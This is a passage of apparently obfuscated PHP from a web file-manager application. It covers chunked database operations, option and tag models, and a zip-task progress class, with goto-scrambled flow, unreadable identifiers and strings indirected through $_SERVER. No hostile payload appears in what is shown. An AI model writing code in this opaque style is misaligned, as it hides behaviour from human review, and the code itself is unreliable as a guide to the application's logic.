"\165\160\144\141\164\x65\x20{$EòÏñíßÉé}\40\x73\145\x74\40{$f„âÃœ„ƒ£}\x20\x77\x68\x65\162\145\40{$aæˆ³ó„İõ}\73"; $this->execute($aÆ­Öèì‹•); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($BÓæ¯‰†¤ = false, $E™¢ù‘¾–« = false) { $this->_chunkEvent = $BÓæ¯‰†¤; $this->_chunkEventParam = $E™¢ù‘¾–«; } private function chunkEventCheck($eö‰ô’¢ŒÛ) { if (!$this->_chunkEvent) { return; } $aîÒÒŠÃ¾¿ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $aîÒÒŠÃ¾¿[$_SERVER[³‘’¼äÑ™ÔÍ][363]] = $eö‰ô’¢ŒÛ; Hook::trigger($this->_chunkEvent, $aîÒÒŠÃ¾¿); } public function addAll($e§µ¥é“£¤, $eœïŞÈÂˆ = array(), $fË “Ø—ÃÍ = false) { goto eøòÃ“¡²; e—’ÔÕ±±Ë: if (method_exists($this->db, $B¥ÓöºíË[260])) { for ($báÏ¥ÀŒå° = 0; $báÏ¥ÀŒå° < count($e§µ¥é“£¤); $báÏ¥ÀŒå° += $B›¼Â¥Æ») { $B®”îÄ²ÅŒ = array_slice($e§µ¥é“£¤, $báÏ¥ÀŒå°, $B›¼Â¥Æ»); if (!is_array($B®”îÄ²ÅŒ) || count($B®”îÄ²ÅŒ) == 0) { break; } $F¿ÄóšÈè = $this->db->insertAll($B®”îÄ²ÅŒ, $eœïŞÈÂˆ, $fË “Ø—ÃÍ); $this->chunkEventCheck(count($B®”îÄ²ÅŒ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($e§µ¥é“£¤ as $C´‹µçæ¶ => $EÒà¦öÀæä) { $F¿ÄóšÈè = $this->db->insert($EÒà¦öÀæä, $eœïŞÈÂˆ, $fË “Ø—ÃÍ); } $this->commit(); } if (!1 !== $F¿ÄóšÈè) { $C˜–Šè²Æä = $this->getLastInsID(); if ($C˜–Šè²Æä) { return $C˜–Šè²Æä; } } return $F¿ÄóšÈè; goto Dì…­éÜÊµ; f¹¼óÈœÓå: if (empty($e§µ¥é“£¤)) { $this->error = think_lang($B¥ÓöºíË[259]); return !1; } $eœïŞÈÂˆ = $this->_parseOptions($eœïŞÈÂˆ); foreach ($e§µ¥é“£¤ as $C´‹µçæ¶ => $EÒà¦öÀæä) { $e§µ¥é“£¤[$C´‹µçæ¶] = $this->_facade($EÒà¦öÀæä); $this->_beforeInsert($e§µ¥é“£¤[$C´‹µçæ¶], $eœïŞÈÂˆ); } goto e—’ÔÕ±±Ë; eøòÃ“¡²: $B¥ÓöºíË =& $_SERVER[³‘’¼äÑ™ÔÍ]; ignore_timeout(); $B›¼Â¥Æ» = self::SQL_WHERE_IN_CHUNK; goto f¹¼óÈœÓå; Dì…­éÜÊµ: } public function save($EòÄª•¶×‡ = '', $Eñ¶‚àåæ» = array()) { goto D¼í‘éø¶ª; C¯¹Ù‹ª”Ğ: for ($cÍ°†­‡óö = 0; $cÍ°†­‡óö < $C¨˜ºáˆ‡; $cÍ°†­‡óö += $FÙ«á™ßà¸) { $A…ÈÊªõßñ = array_slice($fˆç…‰ñÚ¿, $cÍ°†­‡óö, $FÙ«á™ßà¸); if (!is_array($A…ÈÊªõßñ) || count($A…ÈÊªõßñ) == 0) { break; } $B™³‰ìÎÈî[$a°Ğ†ŒÃÈ¡[263]][$AÜÕ»‘“åæ][1] = $A…ÈÊªõßñ; $this->optionsValue($B™³‰ìÎÈî); $B±¡âÕ• += parent::save($EòÄª•¶×‡, $Eñ¶‚àåæ»); $this->chunkEventCheck(count($A…ÈÊªõßñ)); } $this->chunkEventSet(); return $B±¡âÕ•; goto BÕñÛˆ‰Â; b¢˜Íæ‘ëô: $fˆç…‰ñÚ¿ = $B™³‰ìÎÈî[$a°Ğ†ŒÃÈ¡[263]][$AÜÕ»‘“åæ][1]; $fˆç…‰ñÚ¿ = is_array($fˆç…‰ñÚ¿) ? $fˆç…‰ñÚ¿ : array(); $C¨˜ºáˆ‡ = count($fˆç…‰ñÚ¿); goto C¯¹Ù‹ª”Ğ; D¼í‘éø¶ª: $a°Ğ†ŒÃÈ¡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FÙ«á™ßà¸ = self::SQL_WHERE_IN_CHUNK; $B™³‰ìÎÈî = $this->optionsValue(); goto FãÏœÌ“ˆÀ; FãÏœÌ“ˆÀ: $AÜÕ»‘“åæ = $this->findWhereField($B™³‰ìÎÈî); if (!$AÜÕ»‘“åæ) { return parent::save($EòÄª•¶×‡, $Eñ¶‚àåæ»); } $B±¡âÕ• = 0; goto b¢˜Íæ‘ëô; BÕñÛˆ‰Â: } public function add($aÛÃÇïÕŸŠ = '', $FÖ»í¼ß = array(), $CÍö¨êÜ = false) { if ($this->addTaskStatus && is_array($aÛÃÇïÕŸŠ)) { $this->addTaskData[] = $aÛÃÇïÕŸŠ; return; } return parent::add($aÛÃÇïÕŸŠ, $FÖ»í¼ß, $CÍö¨êÜ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($a§ÎÖÀ«’ç = array()) { goto DóËŸ™““; d®èÈ¶›ÊŠ: $e¾èÔŠŸ£â = is_array($e¾èÔŠŸ£â) ? $e¾èÔŠŸ£â : array(); $dœš ƒ–×‡ = null; for ($Aõ»·Ùôß = 0; $Aõ»·Ùôß < count($e¾èÔŠŸ£â); $Aõ»·Ùôß += $c™áµîº¸ø) { $Då¿µÈôÅ = array_slice($e¾èÔŠŸ£â, $Aõ»·Ùôß, $c™áµîº¸ø); if (!is_array($Då¿µÈôÅ) || count($Då¿µÈôÅ) == 0) { break; } $F²‹·ô“«[$CËé‰Şİğé[263]][$C†‚éã­ø‹][1] = $Då¿µÈôÅ; $this->optionsValue($F²‹·ô“«); $c†‚ˆ«Üß¯ = parent::select($a§ÎÖÀ«’ç); if (!$c†‚ˆ«Üß¯) { continue; } if (is_null($dœš ƒ–×‡)) { $dœš ƒ–×‡ = array(); } $dœš ƒ–×‡ = array_merge($dœš ƒ–×‡, $c†‚ˆ«Üß¯); } goto f›‚ç‚ë—±; DóËŸ™““: $CËé‰Şİğé =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c™áµîº¸ø = self::SQL_WHERE_IN_CHUNK; $F²‹·ô“« = $this->optionsValue(); goto A›³‚™¼ÂÒ; A›³‚™¼ÂÒ: $C†‚éã­ø‹ = $this->findWhereField($F²‹·ô“«); if (!$C†‚éã­ø‹ || isset($F²‹·ô“«[$CËé‰Şİğé[280]]) || isset($F²‹·ô“«[$CËé‰Şİğé[340]])) { return parent::select($a§ÎÖÀ«’ç); } $e¾èÔŠŸ£â = $F²‹·ô“«[$CËé‰Şİğé[263]][$C†‚éã­ø‹][1]; goto d®èÈ¶›ÊŠ; f›‚ç‚ë—±: return $dœš ƒ–×‡; goto eôòã®ã¯Ğ; eôòã®ã¯Ğ: } public function delete($Dà†í±»‡— = array()) { goto fÓ¡Ü¤Û¬Ó; DƒŠ™Ñ×¾Ö: $d‹„°Ùö¼ = $E§¿Á°’¹Ã[$D÷ÊŞÌ¤©â[263]][$C•´¢å±Ğ][1]; $d‹„°Ùö¼ = is_array($d‹„°Ùö¼) ? $d‹„°Ùö¼ : array(); for ($FÌÈáç£¡è = 0; $FÌÈáç£¡è < count($d‹„°Ùö¼); $FÌÈáç£¡è += $BØ™‘¿¢) { $F‰‰‘Î‹Ú× = array_slice($d‹„°Ùö¼, $FÌÈáç£¡è, $BØ™‘¿¢); if (!is_array($F‰‰‘Î‹Ú×) || count($F‰‰‘Î‹Ú×) == 0) { break; } $E§¿Á°’¹Ã[$D÷ÊŞÌ¤©â[263]][$C•´¢å±Ğ][1] = $F‰‰‘Î‹Ú×; $this->optionsValue($E§¿Á°’¹Ã); $CçÙ ®ººä += parent::delete($Dà†í±»‡—); } goto eÄä‹Ñï’; DÖŒêŒ×´: $C•´¢å±Ğ = $this->findWhereField($E§¿Á°’¹Ã); if (!$C•´¢å±Ğ) { return parent::delete($Dà†í±»‡—); } $CçÙ ®ººä = 0; goto DƒŠ™Ñ×¾Ö; fÓ¡Ü¤Û¬Ó: $D÷ÊŞÌ¤©â =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BØ™‘¿¢ = self::SQL_WHERE_IN_CHUNK; $E§¿Á°’¹Ã = $this->optionsValue(); goto DÖŒêŒ×´; eÄä‹Ñï’: return $CçÙ ®ººä; goto C…óŒƒÊ•Õ; C…óŒƒÊ•Õ: } private function findWhereField($cÄ¢É¨ƒå) { $b·ÀŞÜÍÀÊ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FŒ‚ƒ´Ó³ = self::SQL_WHERE_IN_CHUNK; if (!is_array($cÄ¢É¨ƒå) || !is_array($cÄ¢É¨ƒå[$b·ÀŞÜÍÀÊ[263]])) { return !1; } foreach ($cÄ¢É¨ƒå[$b·ÀŞÜÍÀÊ[263]] as $bÛ÷ªŒğñ‰ => $F”øçêÜ) { if (is_array($F”øçêÜ) && isset($F”øçêÜ[0]) && is_string($F”øçêÜ[0]) && strtolower($F”øçêÜ[0]) == $b·ÀŞÜÍÀÊ[7] && is_array($F”øçêÜ[1]) && count($F”øçêÜ[1]) > $FŒ‚ƒ´Ó³) { ignore_timeout(); return $bÛ÷ªŒğñ‰; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\145\x6d\117\x70\x74\x69\x6f\x6e"; public $field = array(); public function listData($D¤î¢ññˆ© = false, $fÄ¯‚ó„›‡ = "\155\157\x64\x69\146\171\124\x69\155\145", $D®¸¼çƒÁ = false) { $F×³”¡îÍ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$F×³”¡îÍ) { return $D¤î¢ññˆ© ? null : array(); } if (!$D¤î¢ññˆ©) { $F×³”¡îÍ = array_filter(array_values($F×³”¡îÍ)); return array_sort_by($F×³”¡îÍ, $fÄ¯‚ó„›‡, $D®¸¼çƒÁ); } return $F×³”¡îÍ[$_SERVER[³‘’¼äÑ™ÔÍ][364] . $D¤î¢ññˆ©]; } public function insert($E³¢ñº—É) { goto bíåìøê¾; aª³×„‘á: $b´ºÌ—•£À = $b´ºÌ—•£À ? $b´ºÌ—•£À : 0; $E³¢ñº—É[$fÑ¡±ÙØ®[367]] = ++$b´ºÌ—•£À; $E³¢ñº—É[$fÑ¡±ÙØ®[187]] = time(); goto E„Š°½•; E„Š°½•: $E³¢ñº—É[$fÑ¡±ÙØ®[107]] = time(); Model($this->modelType)->set($fÑ¡±ÙØ®[365], $b´ºÌ—•£À, $this->optionType . $fÑ¡±ÙØ®[366]); Model($this->modelType)->set($fÑ¡±ÙØ®[364] . $b´ºÌ—•£À, $E³¢ñº—É, $this->optionType); goto b©¡©ÕŞ±—; b©¡©ÕŞ±—: return $b´ºÌ—•£À; goto Eêé¥¡»˜; bíåìøê¾: $fÑ¡±ÙØ® =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E³¢ñº—É = array_field_key($E³¢ñº—É, $this->field); $b´ºÌ—•£À = Model($this->modelType)->get($fÑ¡±ÙØ®[365], $this->optionType . $fÑ¡±ÙØ®[366]); goto aª³×„‘á; Eêé¥¡»˜: } public function update($CøÊŞ½¨³ª, $bèÎËÍ‡óß) { goto EÄ¶Ìé­ƒ; A•ö¸ÖªÜ: return Model($this->modelType)->set($CÊÀÂ¹ÛÔù[364] . $CøÊŞ½¨³ª, $bèÎËÍ‡óß, $this->optionType); goto dİ†ÆŞô¬ô; CƒÑ¸·ÁøÉ: if (!$CÌåÖëïÙ) { return !1; } $bèÎËÍ‡óß = array_merge($CÌåÖëïÙ, $bèÎËÍ‡óß); $bèÎËÍ‡óß[$CÊÀÂ¹ÛÔù[107]] = time(); goto A•ö¸ÖªÜ; EÄ¶Ìé­ƒ: $CÊÀÂ¹ÛÔù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bèÎËÍ‡óß = array_field_key($bèÎËÍ‡óß, $this->field); $CÌåÖëïÙ = $this->listData($CøÊŞ½¨³ª); goto CƒÑ¸·ÁøÉ; dİ†ÆŞô¬ô: } public function remove($E±š‚âÉòö) { return Model($this->modelType)->remove($_SERVER[³‘’¼äÑ™ÔÍ][364] . $E±š‚âÉòö, $this->optionType); } public function clear() { $CŞ³é²°æ¬ =& $_SERVER[³‘’¼äÑ™ÔÍ]; Model($this->modelType)->remove($CŞ³é²°æ¬[365], $this->optionType . $CŞ³é²°æ¬[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($EÙÙ„À‹ø, $d¸÷¼À©›ø) { if (!$d¸÷¼À©›ø) { return !1; } $F´£õ«¯‰ê = $this->listData(); $F´£õ«¯‰ê = array_to_keyvalue($F´£õ«¯‰ê, $EÙÙ„À‹ø); return isset($F´£õ«¯‰ê[$d¸÷¼À©›ø]) ? $F´£õ«¯‰ê[$d¸÷¼À©›ø] : !1; } public function findByName($cà¶Âå¥Ô) { return $this->findByKey($_SERVER[³‘’¼äÑ™ÔÍ][28], $cà¶Âå¥Ô); } protected function resetData($EÈ¿Éæâ¿ä) { $F·²ß‚±˜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EÈ¿Éæâ¿ä = is_array($EÈ¿Éæâ¿ä) ? $EÈ¿Éæâ¿ä : array(); $eÁ˜Âˆô¼˜ = array(); for ($fÀ¹Òí¥š¿ = 0; $fÀ¹Òí¥š¿ < count($EÈ¿Éæâ¿ä); $fÀ¹Òí¥š¿++) { $eÁ˜Âˆô¼˜[$F·²ß‚±˜[364] . $EÈ¿Éæâ¿ä[$fÀ¹Òí¥š¿][$F·²ß‚±˜[367]]] = $EÈ¿Éæâ¿ä[$fÀ¹Òí¥š¿]; } return Model($this->modelType)->set($eÁ˜Âˆô¼˜, !1, $this->optionType); } private function getAutoName($F¥¿†ä‰«) { $f‡…ÄĞï‹è = array_to_keyvalue($this->listData(), $_SERVER[³‘’¼äÑ™ÔÍ][28]); if (!$f‡…ÄĞï‹è || !isset($f‡…ÄĞï‹è[$F¥¿†ä‰«])) { return $F¥¿†ä‰«; } for ($d½×à¦…Ìº = 1; $d½×à¦…Ìº < count($f‡…ÄĞï‹è); $d½×à¦…Ìº++) { $d×ÓŸ¶òê = $F¥¿†ä‰« . "\50{$d½×à¦…Ìº}\x29"; if (!isset($f‡…ÄĞï‹è[$d×ÓŸ¶òê])) { return $d×ÓŸ¶òê; } } return $d×ÓŸ¶òê; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($A¢áƒœƒ±Ú = false, $cÒÈ—Ïó«Á = '', $B†»ì™‡Îã = false) { goto cä½ó¶“ˆ°; Bâçê¯†Ù´: $this->cacheSet($cÒÈ—Ïó«Á, $f®§ïãŠ¬); $f®§ïãŠ¬ = array_merge($c¯Œã£Á·Ú, $f®§ïãŠ¬); return $A¢áƒœƒ±Ú ? $f®§ïãŠ¬[$A¢áƒœƒ±Ú] : $f®§ïãŠ¬; goto AŠ¥±ƒ±Ø; Bê•óğô¡¿: $c¯Œã£Á·Ú = is_array($c¯Œã£Á·Ú) ? $c¯Œã£Á·Ú : array(); if (is_array($f®§ïãŠ¬)) { $f®§ïãŠ¬ = array_merge($c¯Œã£Á·Ú, $f®§ïãŠ¬); return $A¢áƒœƒ±Ú ? isset($f®§ïãŠ¬[$A¢áƒœƒ±Ú]) ? $f®§ïãŠ¬[$A¢áƒœƒ±Ú] : null : $f®§ïãŠ¬; } $dÓ¸‚êˆ = $this->filterWhere(array($cã¸º´ÅÃ[29] => $cÒÈ—Ïó«Á)); goto A×Ø³Ä“Íù; cä½ó¶“ˆ°: $cã¸º´ÅÃ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f®§ïãŠ¬ = $this->cacheGet($cÒÈ—Ïó«Á); $c¯Œã£Á·Ú = $this->optionDefault($cÒÈ—Ïó«Á); goto Bê•óğô¡¿; A×Ø³Ä“Íù: $f®§ïãŠ¬ = $this->where($dÓ¸‚êˆ)->select(); $f®§ïãŠ¬ = array_to_keyvalue($f®§ïãŠ¬, $cã¸º´ÅÃ[89], $cã¸º´ÅÃ[359]); foreach ($f®§ïãŠ¬ as $aÚÑ·®À† => $aªæˆ¤İ¨†) { if ($B†»ì™‡Îã || in_array($aÚÑ·®À†, $this->jsonField)) { $f®§ïãŠ¬[$aÚÑ·®À†] = json_decode($aªæˆ¤İ¨†, !0); } } goto Bâçê¯†Ù´; AŠ¥±ƒ±Ø: } public function set($EÆ „Û–…, $aØ¸»ŠØÓˆ = false, $bóø¡•¨á = '') { goto b§¡Æ“œœ©; BˆÀ‡ŞÒÏ: return $this->addAll($c·ÎÄÒ£Ì¸, array(), !0); goto C‡Õ˜èÉ×ù; b§¡Æ“œœ©: $cå±¾ŒÀŠ¾ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->cacheRemove($bóø¡•¨á); $c·ÎÄÒ£Ì¸ = array(); goto CÑ°Úê¯íî; CÑ°Úê¯íî: $EƒìéÑ•èƒ = is_array($EÆ „Û–…) ? $EÆ „Û–… : array($EÆ „Û–… => $aØ¸»ŠØÓˆ); foreach ($EƒìéÑ•èƒ as $C¤Šâ‡¾Ú· => $B¼Ñ±¸«å½) { if (is_array($B¼Ñ±¸«å½)) { $B¼Ñ±¸«å½ = json_encode_force($B¼Ñ±¸«å½); } $this->checkLength($B¼Ñ±¸«å½, !1, $this->tableName . $cå±¾ŒÀŠ¾[4] . $EÆ „Û–…); $B¼Ñ±¸«å½ = self::textEncode($B¼Ñ±¸«å½); $EƒìéÑ•èƒ = array($cå±¾ŒÀŠ¾[29] => $bóø¡•¨á, $cå±¾ŒÀŠ¾[89] => $C¤Šâ‡¾Ú·, $cå±¾ŒÀŠ¾[359] => $B¼Ñ±¸«å½); $c·ÎÄÒ£Ì¸[] = $this->filterWhere($EƒìéÑ•èƒ); } if (!$c·ÎÄÒ£Ì¸) { return !0; } goto BˆÀ‡ŞÒÏ; C‡Õ˜èÉ×ù: } protected function optionDefault($A¨¨®™‰¾— = '') { return !1; } public function setDeep($c†•¸ìŒ•æ, $aÇ˜¬â£ë = false, $fµÉ¶ÑœçÀ = '') { $dëâ¥Œ¬Ôê = explode($_SERVER[³‘’¼äÑ™ÔÍ][91], $c†•¸ìŒ•æ); $f‡ô‡Ã‚›Æ = $this->get(); array_set_value($f‡ô‡Ã‚›Æ, $c†•¸ìŒ•æ, $aÇ˜¬â£ë); $this->set($dëâ¥Œ¬Ôê[0], $f‡ô‡Ã‚›Æ[$dëâ¥Œ¬Ôê[0]], $fµÉ¶ÑœçÀ); } public function remove($c²´§ªˆİ, $eÅ­»êÄ°Š = '') { $EÀÈÆóÑ’ğ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->cacheRemove($eÅ­»êÄ°Š); $bÁØöÑ…Š´ = $this->filterWhere(array($EÀÈÆóÑ’ğ[89] => $c²´§ªˆİ, $EÀÈÆóÑ’ğ[29] => $eÅ­»êÄ°Š)); if (is_null($c²´§ªˆİ)) { unset($bÁØöÑ…Š´[$EÀÈÆóÑ’ğ[89]]); } return $this->where($bÁØöÑ…Š´)->delete(); } public function cacheSet($eª™Ï©ï‡´, $Fƒ¸á±‰ïß = false) { return Cache::set($this->cacheKey($eª™Ï©ï‡´), $Fƒ¸á±‰ïß); } public function cacheGet($D÷óÑ¸İß) { return Cache::get($this->cacheKey($D÷óÑ¸İß)); } public function cacheRemove($fƒÏé½—Ë) { return Cache::remove($this->cacheKey($fƒÏé½—Ë)); } protected function filterWhere($fãÖÈÅÎí–) { return $fãÖÈÅÎí–; } protected function cacheKey($AÇÊÚ‡³ğÛ) { return $AÇÊÚ‡³ğÛ; } } goto F·¯®ñØ‚Ú; f•çèä¡¤: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\162\x2e\164\x61\x67\x4c\151\x73\x74"; public $modelType = "\125\163\145\162\x4f\x70\x74\151\x6f\x6e"; public $field = array("\156\141\155\x65", "\x73\x74\171\x6c\145", "\163\157\162\x74"); public function listData($bôáÎ½±®¿ = false, $b´ß“Ë®ªØ = "\x73\x6f\x72\x74", $F ¿éÌÁì¿ = false) { return parent::listData($bôáÎ½±®¿, $b´ß“Ë®ªØ, $F ¿éÌÁì¿); } public function remove($CâÖŒ¨¿¿†) { return parent::remove($CâÖŒ¨¿¿†); } public function add($c´œ‰ï›’, $d£ÑÄ®ìæ = "\154\x61\x62\x65\x6c\x2d\x67\x72\145\x79\x2d\156\157\162\155\x61\x6c") { $b’¸†Ùáï• =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($this->findByName($c´œ‰ï›’)) { return !1; } $a¢‹Ğ”ÅçÄ = array($b’¸†Ùáï•[386] => $c´œ‰ï›’, $b’¸†Ùáï•[437] => $d£ÑÄ®ìæ, $b’¸†Ùáï•[2117] => $this->getSort($b’¸†Ùáï•[246]) + 1); return parent::insert($a¢‹Ğ”ÅçÄ); } public function update($EßšËˆ×»ô, $Dî‹Òå½¹Æ) { $EÚ®íî“ë =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f†ÁêìÔ¶ = $this->listData($EßšËˆ×»ô); $BÁ¾Æ‡°šñ = $this->findByName($Dî‹Òå½¹Æ[$EÚ®íî“ë[28]]); if (!$f†ÁêìÔ¶ || $BÁ¾Æ‡°šñ && $BÁ¾Æ‡°šñ[$EÚ®íî“ë[367]] != $f†ÁêìÔ¶[$EÚ®íî“ë[367]]) { return !1; } return parent::update($EßšËˆ×»ô, $Dî‹Òå½¹Æ); } public function moveTop($bÏ¤¼å«ÏÜ) { $fÕÆ‹’ôÜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e‘Ì·’ƒ½¦ = parent::listData(); $dèëÙ±ìŠ = $this->getSort($fÕÆ‹’ôÜ[245]); foreach ($e‘Ì·’ƒ½¦ as &$dƒŠ­—ÖŒ‰) { if ($dƒŠ­—ÖŒ‰[$fÕÆ‹’ôÜ[367]] == $bÏ¤¼å«ÏÜ) { $dƒŠ­—ÖŒ‰[$fÕÆ‹’ôÜ[2134]] = $dèëÙ±ìŠ; continue; } $dƒŠ­—ÖŒ‰[$fÕÆ‹’ôÜ[2134]] += 1; } return parent::resetData($e‘Ì·’ƒ½¦); } public function moveBottom($c®äÔ“ØÓ) { $F–¦õÆ‚å˜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Dó©§Å“œ = $this->getSort($F–¦õÆ‚å˜[246]) + 1; return parent::update($c®äÔ“ØÓ, array($F–¦õÆ‚å˜[2134] => $Dó©§Å“œ)); } public function resetSort($c…ŞæÛ»ŞÕ) { goto BÎ¤æ¯„; a¡ƒõ¥÷«¿: return parent::resetData($C²ØäË£); goto fÃ’£Ë¬Ó; B¯ƒÏÀ™Ğ™: for ($f’…ö©óŠ = 0; $f’…ö©óŠ < count($c…ŞæÛ»ŞÕ); $f’…ö©óŠ++) { $C×–˜‘ÈİÁ[$c…ŞæÛ»ŞÕ[$f’…ö©óŠ] . $b÷ç‘ ÆêÓ[33]] = $f’…ö©óŠ + 1; } $C²ØäË£ = parent::listData(); foreach ($C²ØäË£ as &$A­ÙìÛÔé) { $EµÔÜÂ Æá = $C×–˜‘ÈİÁ[$A­ÙìÛÔé[$b÷ç‘ ÆêÓ[367]]]; $A­ÙìÛÔé[$b÷ç‘ ÆêÓ[2134]] = $EµÔÜÂ Æá ? $EµÔÜÂ Æá : $A­ÙìÛÔé[$b÷ç‘ ÆêÓ[2134]]; } goto a¡ƒõ¥÷«¿; BÎ¤æ¯„: $b÷ç‘ ÆêÓ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C×–˜‘ÈİÁ = array(); $c…ŞæÛ»ŞÕ = is_array($c…ŞæÛ»ŞÕ) ? $c…ŞæÛ»ŞÕ : array(); goto B¯ƒÏÀ™Ğ™; fÃ’£Ë¬Ó: } private function getSort($dÏ §ÓÅ¸ò) { $BµÊÊÉ¨ÌÒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F“ƒÉê«ØÃ = parent::listData(); $cÈ¼¡ÍñÇ = array_to_keyvalue($F“ƒÉê«ØÃ, $BµÊÊÉ¨ÌÒ[33], $BµÊÊÉ¨ÌÒ[2134]); if (!$cÈ¼¡ÍñÇ) { $cÈ¼¡ÍñÇ = array(0); } $fŠ‚ˆÑÒ¢ = $dÏ §ÓÅ¸ò == $BµÊÊÉ¨ÌÒ[246] ? max($cÈ¼¡ÍñÇ) : min($cÈ¼¡ÍñÇ); return intval($fŠ‚ˆÑÒ¢); } } goto e¡ß¯Ö¹ß…; aŠ°ĞÉïª: class TaskZip extends TaskFileTransfer { protected function startAfter() { $bÎÈøïè =& $_SERVER[³‘’¼äÑ™ÔÍ]; parent::startAfter(); Hook::bind($bÎÈøïè[1521], array($this, $bÎÈøïè[1516])); $aõØ×«®õ¸ =& $this->task; $aõØ×«®õ¸[$bÎÈøïè[1518]] = $bÎÈøïè[1044]; if (!$aõØ×«®õ¸[$bÎÈøïè[1351]]) { $aõØ×«®õ¸[$bÎÈøïè[1351]] = LNG($bÎÈøïè[1522]); } } protected function endAfter() { $fÛùÅªé =& $_SERVER[³‘’¼äÑ™ÔÍ]; parent::endAfter(); Hook::unbind($fÛùÅªé[1521], array($this, $fÛùÅªé[1516])); } public function updateAfter() { $Cßùê ô =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dÆÇíÎáÃè =& $this->task; if (!$dÆÇíÎáÃè[$Cßùê ô[980]] || !$dÆÇíÎáÃè[$Cßùê ô[701]]) { return; } if ($dÆÇíÎáÃè[$Cßùê ô[1518]] == $Cßùê ô[1044]) { $cŸá·î¨ï‰ = $dÆÇíÎáÃè[$Cßùê ô[1491]]; if ($dÆÇíÎáÃè[$Cßùê ô[1492]] != $Cßùê ô[1044]) { $cŸá·î¨ï‰ = 0; } $EÃªæç¹¶Á = ($dÆÇíÎáÃè[$Cßùê ô[1495]] + $cŸá·î¨ï‰) / $dÆÇíÎáÃè[$Cßùê ô[701]]; $dÆÇíÎáÃè[$Cßùê ô[1446]] = $EÃªæç¹¶Á * 0.3; } else { if ($dÆÇíÎáÃè[$Cßùê ô[1518]] == $Cßùê ô[301]) { $EÃªæç¹¶Á = $dÆÇíÎáÃè[$Cßùê ô[994]] / $dÆÇíÎáÃè[$Cßùê ô[980]]; $dÆÇíÎáÃè[$Cßùê ô[1446]] = 0.3 + $EÃªæç¹¶Á * 0.5; } else { if ($dÆÇíÎáÃè[$Cßùê ô[1518]] == $Cßùê ô[103]) { $EÃªæç¹¶Á = 0; if ($dÆÇíÎáÃè[$Cßùê ô[1490]]) { $EÃªæç¹¶Á = $dÆÇíÎáÃè[$Cßùê ô[1491]] / $dÆÇíÎáÃè[$Cßùê ô[1490]]; } $dÆÇíÎáÃè[$Cßùê ô[1446]] = 0.3 + 0.5 + $EÃªæç¹¶Á * 0.2; } } } if ($dÆÇíÎáÃè[$Cßùê ô[1446]] > 0) { $d•ŞãÛ°ê = timeFloat() - $dÆÇíÎáÃè[$Cßùê ô[1448]] - $dÆÇíÎáÃè[$Cßùê ô[1451]]; $dÆÇíÎáÃè[$Cßùê ô[1452]] = $d•ŞãÛ°ê * (1 - $dÆÇíÎáÃè[$Cßùê ô[1446]]) / $dÆÇíÎáÃè[$Cßùê ô[1446]]; } } public function copyFileStart($dçñ«ßÜ„ƒ, $eÙÔ¨ë…¹Ä, $BÜé¾é–ÔÎ, $Bø¡ŠÑˆœÖ, $cñ…Ğ¦Ñ÷±, $e£¬ôšÙİ) { $Fª»ÂõÈ¬ =& $_SERVER[³‘’¼äÑ™ÔÍ]; parent::copyFileStart($dçñ«ßÜ„ƒ, $eÙÔ¨ë…¹Ä, $BÜé¾é–ÔÎ, $Bø¡ŠÑˆœÖ, $cñ…Ğ¦Ñ÷±, $e£¬ôšÙİ); $BÓá©Ô÷äè =& $this->task; if ($BÓá©Ô÷äè[$Fª»ÂõÈ¬[1518]] == $Fª»ÂõÈ¬[301]) { $BÓá©Ô÷äè[$Fª»ÂõÈ¬[1518]] = $Fª»ÂõÈ¬[103]; } $this->update(); } public function copyFileEnd($e”íğ›ø”Ö, $b¦ÑøîéÔŒ, $a‚ó¦æöÙë, $d½¼£¸Î³, $Cé³Û‚–®†, $Aß‘Æ·†¡Ë) { $fóœ›ÔŞñæ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EÅ™Ÿá´Ùã =& $this->task; $EÅ™Ÿá´Ùã[$fóœ›ÔŞñæ[1491]] = $EÅ™Ÿá´Ùã[$fóœ›ÔŞñæ[1490]]; $EÅ™Ÿá´Ùã[$fóœ›ÔŞñæ[1495]] += $EÅ™Ÿá´Ùã[$fóœ›ÔŞñæ[1490]]; $EÅ™Ÿá´Ùã[$fóœ›ÔŞñæ[1492]] = $fóœ›ÔŞñæ[33]; $this->update(); } public function nameParse($a‰ËÄˆš¥Ù) { $e÷ÆãÃ³Ó =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FÑœÎØÚ‚ =& $this->task; if ($FÑœÎØÚ‚[$e÷ÆãÃ³Ó[994]] < $FÑœÎØÚ‚[$e÷ÆãÃ³Ó[980]]) { $bÈ«ÅÛ“ÏÇ = get_path_this($a‰ËÄˆš¥Ù); if (strstr($bÈ«ÅÛ“ÏÇ, $e÷ÆãÃ³Ó[91])) { $FÑœÎØÚ‚[$e÷ÆãÃ³Ó[994]] += 1; } } if ($FÑœÎØÚ‚[$e÷ÆãÃ³Ó[1518]] == 